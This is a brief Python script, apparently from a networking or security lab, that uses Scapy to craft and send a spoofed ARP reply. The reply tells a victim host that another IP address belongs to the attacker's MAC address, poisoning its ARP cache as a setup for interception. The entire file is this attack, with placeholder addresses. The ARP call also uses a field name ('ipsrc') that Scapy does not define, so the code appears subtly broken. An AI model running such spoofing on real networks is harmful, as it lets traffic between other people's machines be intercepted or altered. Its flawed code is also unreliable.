#!/usr/bin/env python3
from scapy.all import *

IP_VIC = "IP"
MAC_VIC_REAL = "MAC"

IP_TARGET = "IP"         # who attacker is pretending to be
MAC_ATTACKER = "MAC"     

ether = Ether(src = MAC_ATTACKER, dst = MAC_VIC_REAL)
arp = ARP(ipsrc = IP_TARGET, hwsrc = MAC_ATTACKER, pdst = IP_VIC, hwdst = MAC_VIC_REAL)

arp.op = 2  # operation code (1 arp request) (2 arp reply)

frame = ether/arp
sendp(frame)